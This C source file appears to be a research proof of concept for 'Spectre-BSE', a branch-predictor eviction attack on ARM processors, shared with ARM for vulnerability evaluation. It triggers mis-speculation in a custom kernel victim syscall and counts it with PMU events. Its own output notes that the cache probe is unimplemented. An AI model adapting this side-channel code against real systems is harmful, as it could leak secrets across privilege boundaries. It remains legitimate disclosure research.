/*
 * PoC Codes for Bias-Free Branch Predicion Exploitation
 *
 * Thursday, September 12th 2024
 *
 * Yuhui Zhu - yuhui.zhu@santannapisa.it
 * Alessandro Biondi - alessandro.biondi@santannapisa.it
 *
 * ReTiS Lab, Scuola Superiore Sant'Anna
 * Pisa, Italy
 *
 * This copy is distributed to ARM for vulnerability evaluation.
 */

#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <argp.h>
#include "utils.h"
#include "jit_snippets.h"
#include "target.h"
#include "pmu_debug.h"

#ifndef DBG_PMU_EL0
/* BUG: On Linux 5.15.71, it seems that the kernel disabled memory mapping between user space and kernel space.
 * So we can't setup the FLUSH+PROBE now and DBG_PMU_EL0 flag is mandatory.
 * Please setup PMCR_EL0 before running this demo. */
#error "Accessing PMU at EL0 is mandatory for this demo!"
#endif

#define SIZE_CACHE_STRIDE 256

#define NR_MAX_EVICT_BRANCHES 2
#define DEMO_TEST_ROUNDS 1024
#define DEMO_TEST_ROUNDS_CACHE_LAT 128
#define BSE_VICTIM_DUMMY_SECRET 128
#define BSE_VICTIM_DUMMY_SECRET_PTR (void *)0xffff800009cdd4a8

enum bse_victim_syscall_option
{
    BSE_V_OPT_SETUP,
    BSE_V_OPT_SAFE,
    BSE_V_OPT_LEAK
};

void do_test_mem_latency();
int do_test_spec_bse();
void init_non_biased_marks();
void prep_snippets();
void print_result();
uint64_t virt_to_physmap(uint64_t virtual_address);

int nr_evict_branches = 0;
uint64_t evict_addr[NR_MAX_EVICT_BRANCHES] = {0}; 

/* Parse a single option. */
static error_t parse_opt (int key, char *arg, struct argp_state *state)
{
	switch (key)
	{
        case 'e':
            evict_addr[nr_evict_branches++] = strtoull(arg, NULL, 16)&0xffffffffULL;
            printf("Eviction address %d set to 0x%lx\n", nr_evict_branches, evict_addr[nr_evict_branches - 1]);
            break;
		case ARGP_KEY_ARG:
			break;
		case ARGP_KEY_END:
			break;
		default:
			return ARGP_ERR_UNKNOWN;
	}
	return 0;
}

static error_t parse_opt (int key, char *arg, struct argp_state *state);
static struct argp_option options[] =
{
    {"evict-addr",    'e',    "ADDR",     0,      "Address to on which to perform eviction, hex value starting with \"0x\"."},	{ 0 }
};
static struct argp argp = { options, parse_opt, NULL, NULL };

void *tramp_ret;

__attribute__((aligned(4096)))
uint8_t *cache_probe_mem,
    *cache_probe_mem_kernel;
void *bse_dummy_secret_ptr;

__attribute__((aligned(4096)))
jit_bst_entry_blr_t Bx_evict[NR_MAX_EVICT_BRANCHES];

__attribute__((aligned(4096)))
uint64_t results_mem_cycles[DEMO_TEST_ROUNDS];
uint64_t results_mem_cycles_bse[DEMO_TEST_ROUNDS];
uint8_t results_spec_marks[DEMO_TEST_ROUNDS];
uint8_t results_spec_marks_bse[DEMO_TEST_ROUNDS];
uint64_t cycles_slow, cycles_fast;

#ifdef DBG_PMU_EL0
// Use PMU marks to monitor speculations
#define DBG_PMU_EL0_evcntrs_pre_spec_bse() __cntr_target1_spec = get_mark_VFP_SPEC();
#define DBG_PMU_EL0_evcntrs_post_spec_bse() results_spec_marks[round] = get_mark_VFP_SPEC() - __cntr_target1_spec;
register uint64_t __cntr_target1_spec asm("x23");
#else
#define DBG_PMU_EL0_evcntrs_pre_spec_bse()
#define DBG_PMU_EL0_evcntrs_post_spec_bse()
#endif

void do_bst_eviction()
{
    Bx_evict[0](RET_MEM_WRITE_IBHB(5));
    Bx_evict[1](RET_MEM_WRITE_IBHB(5));
}

void do_nothing() {}

int main(int argc, char *argv[], char *envp[])
{
    argp_parse(&argp, argc, argv, 0, 0, 0);
    if (nr_evict_branches == 0)
    {
        printf("Must specify at least one eviction address.\n");
        return -1;
    }

    get_os_params();
    syscall(CUST_SYSCALL_ENABLE_PMU_EL0);
    init_pmu();

    // Create an executable memory that filled by RET ops. These RET ops can be used by indirect branches in BH[n] as branch targets to populate the iBHB.
    tramp_ret = prep_ret_mem((void *)0x5000, 1 << IB_RET_MEM_RANGE, 0, 0, NULL);
    // allocate cache side-channel probes
    cache_probe_mem = mmap(NULL, 256 * SIZE_CACHE_STRIDE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    memset(cache_probe_mem, 0x41, 256 * SIZE_CACHE_STRIDE);

    // deploy Bx_evict snippets to given addresses
    prep_snippets(); // TODO: get addresses from kallsyms on the fly

    // test the memory access latency
    do_test_mem_latency();
    // set non-biased marks for all branches in the victim snippet to make sure all footprints of all the branches are recorded
    init_non_biased_marks();
    // yosoro!
    // TODO: get address of bse_dummy_secret from kallsyms on the fly
    // bse_dummy_secret_ptr = BSE_VICTIM_DUMMY_SECRET_PTR;
    do_test_spec_bse(bse_dummy_secret_ptr, do_bst_eviction, results_mem_cycles_bse, results_spec_marks_bse);
    do_test_spec_bse(bse_dummy_secret_ptr, do_nothing, results_mem_cycles, results_spec_marks);
    // print_result
    print_result();
}

void do_test_mem_latency()
{
    register uint64_t __cycles_slow = 0;
    register uint64_t __cycles_fast = 0;
    volatile uint8_t *probe_ptr = &cache_probe_mem[192];
    memset(cache_probe_mem, 0x41, 256 * SIZE_CACHE_STRIDE);

    read_cycles();

    for (int i = 0; i < DEMO_TEST_ROUNDS_CACHE_LAT; i++)
    {
        WAIT_ALL_OPS_RETIRE(64);
        MEM_FLUSH_DC_CIVAC(probe_ptr);
        WAIT_ALL_OPS_RETIRE(64);
        __cycles_slow += mem_access_time(probe_ptr);
    }

    WAIT_ALL_OPS_RETIRE(64);

    for (int i = 0; i < DEMO_TEST_ROUNDS_CACHE_LAT; i++)
    {
        WAIT_ALL_OPS_RETIRE(64);
        MEM_ACCESS(probe_ptr);
        WAIT_ALL_OPS_RETIRE(64);
        __cycles_fast += mem_access_time(probe_ptr);
    }

    WAIT_ALL_OPS_RETIRE(64);

    cycles_slow = __cycles_slow;
    cycles_fast = __cycles_fast;
}

int do_test_spec_bse(uint8_t *secret_ptr, void do_eviction(void), uint64_t results_mem_cycles[DEMO_TEST_ROUNDS], uint8_t results_spec_marks[DEMO_TEST_ROUNDS])
{
    // in this demo, we just validate if cpu can fetch the expected memory address into the cache when a spetre-bse attack is fired
    // so we calculate the expected probe address based on the secred value and only check the corresponding probe here
    volatile uint8_t *expected_cache_probe_ptr = &cache_probe_mem[BSE_VICTIM_DUMMY_SECRET * SIZE_CACHE_STRIDE];
    for (int round = 0; round < DEMO_TEST_ROUNDS; round++)
    {
        // do this in every iteration in case of the OS emits a BPU reset
        init_non_biased_marks();

        for (int i = 0; i < 2; i++)
        {
            syscall(CUST_SYSCALL_BSE_VICTIM, BSE_V_OPT_LEAK, secret_ptr);
            WAIT_ALL_OPS_RETIRE(32);

            // not mandatory but keeping it would be better
            syscall(CUST_SYSCALL_BSE_VICTIM, BSE_V_OPT_SAFE, secret_ptr);
            WAIT_ALL_OPS_RETIRE(32);
        }

        do_eviction();
        MEM_FLUSH_DC_CIVAC(expected_cache_probe_ptr);
        WAIT_ALL_OPS_RETIRE(32);

        DBG_PMU_EL0_evcntrs_pre_spec_bse();
        // syscall(BSE_VICTIM_SYSCALL, BSE_V_OPT_LEAK, secret_ptr);
        syscall(CUST_SYSCALL_BSE_VICTIM, BSE_V_OPT_SAFE, secret_ptr);
        DBG_PMU_EL0_evcntrs_post_spec_bse();

        results_mem_cycles[round] = mem_access_time(expected_cache_probe_ptr);
        WAIT_ALL_OPS_RETIRE(32);
    }
}

// setup non-biased marks for all b* instructions in the victim snippet, make sure they are all recorded by PHR and BHB.
void init_non_biased_marks()
{
    syscall(CUST_SYSCALL_BSE_VICTIM, BSE_V_OPT_SETUP, cache_probe_mem_kernel);
}

void prep_snippets()
{
    uint64_t length;
    void *base;

    // IBs that footprints are conditionally recorded by PHR according to the update policy.
    length = JIT_SNIPPET_LENGTH(jit_bst_entry_blr);
    for (int i=0; i<nr_evict_branches; i++)
    {
        base = (void *)(evict_addr[i]);
        Bx_evict[i] = prep_aligned_snippets(0, (uint64_t)base, &jit_bst_entry_blr, 0, length, BST_IDX_MSB + 1, NULL);
        printf("Snippet %d prepared at %p\n", i, Bx_evict[i]);
    }
}

void print_result()
{
    int __cycles_sum = 0;
#ifdef DBG_PMU_EL0
    int __marks_sum = 0;
#endif

    printf("\x1b[31mWARNING: \n");
    printf("Cache probe is not implemented in this cross-privilege demo.\n");
    printf("Please ignore this result since there will be no difference before Spectre-BSE and after.\n");
    printf("\x1b[0m\n");

    // printf("Memory access latency (average of %d tests): \n", DEMO_TEST_ROUNDS_CACHE_LAT);
    // printf("slow access: %d\n", cycles_slow / DEMO_TEST_ROUNDS_CACHE_LAT);
    // printf("fast access: %d\n", cycles_fast / DEMO_TEST_ROUNDS_CACHE_LAT);
    // printf("\n");

    printf("--- without Spectre-BSE ---\n");
    // __cycles_sum = 0;
    // for (int round = 0; round < DEMO_TEST_ROUNDS; round++)
    //     __cycles_sum += results_mem_cycles[round];
    // printf("Probe access latency (average of %d tests): %d\n", DEMO_TEST_ROUNDS, __cycles_sum / DEMO_TEST_ROUNDS);
#ifdef DBG_PMU_EL0
    __marks_sum = 0;
    for (int round = 0; round < DEMO_TEST_ROUNDS; round++)
        __marks_sum += (results_spec_marks[round] == 0) ? 0 : 1;
    printf("Mis-speculation succeeded (PMU VFP_SPEC marks): %d/%d\n\n", __marks_sum, DEMO_TEST_ROUNDS);
#endif

    printf("--- WITH Spectre-BSE ---\n");
    // __cycles_sum = 0;
    // for (int round = 0; round < DEMO_TEST_ROUNDS; round++)
    //     __cycles_sum += results_mem_cycles_bse[round];
    // printf("Probe access latency (average of %d tests): %d\n", DEMO_TEST_ROUNDS, __cycles_sum / DEMO_TEST_ROUNDS);
#ifdef DBG_PMU_EL0
    __marks_sum = 0;
    for (int round = 0; round < DEMO_TEST_ROUNDS; round++)
        __marks_sum += (results_spec_marks_bse[round] == 0) ? 0 : 1;
    printf("Mis-speculation succeeded (PMU VFP_SPEC marks): %d/%d\n\n", __marks_sum, DEMO_TEST_ROUNDS);
#endif
}